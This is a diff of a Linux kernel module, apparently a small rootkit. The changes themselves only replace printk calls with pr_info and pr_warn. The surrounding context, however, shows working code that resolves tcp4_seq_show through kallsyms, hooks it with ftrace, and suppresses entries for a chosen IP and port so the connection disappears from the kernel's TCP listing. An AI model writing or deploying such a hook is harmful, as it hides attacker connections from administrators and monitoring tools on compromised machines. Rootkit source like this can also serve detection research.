@@ -33,7 +33,7 @@ int new_tcp4_seq_show(struct seq_file *seq, void *v) {
     char *ipstring = kmalloc(IP_STRING_MAX_LEN, GFP_KERNEL);
     ipaddr_to_string(ipaddr, ipstring);
     if (((ip_to_hide == NULL) && (port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (port == port_to_hide))) {
-        printk(KERN_ALERT "Hiding %s : %u", ipstring, port);
+        pr_info("Hiding %s : %u", ipstring, port);
         kfree(ipstring);
         return 0;
     }
@@ -51,30 +51,30 @@ void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftr
  
 int load(void) {
     if (port_to_hide == -1) {
-        printk("port to hide has not been set! Exiting...");
+        pr_warn("port to hide has not been set! Exiting...");
         return -1;
     }
-    printk(KERN_ALERT "%s:%d", ip_to_hide, port_to_hide);
+    pr_info("%s:%d", ip_to_hide, port_to_hide);
 
-    printk(KERN_ALERT "Initializing...");
+    pr_info("Initializing...");
     tcp4_seq_show_address = kallsyms_lookup_name("tcp4_seq_show");
     if (!tcp4_seq_show_address) {
-        printk(KERN_ALERT "Failed to find tcp4_seq_show!");            
+        pr_warn("Failed to find tcp4_seq_show!");            
         return 0;
     }
 
     original_tcp4_seq_ptr = (original_tcp4_seq_show_t)tcp4_seq_show_address;
     ftrace_set_filter_ip(&ops, (unsigned long)original_tcp4_seq_ptr, 0, 0);
     register_ftrace_function(&ops);
-    printk(KERN_ALERT "Initialized successfuly!");
+    pr_info("Initialized successfuly!");
 
     return 0;
 }
  
 void unload(void) {
-    printk(KERN_ALERT "Shutting down.");
+    pr_info("Shutting down.");
     unregister_ftrace_function(&ops);
-    printk(KERN_ALERT "Goodbye world...");
+    pr_info("Goodbye world...");
 }
 
 module_init(load);
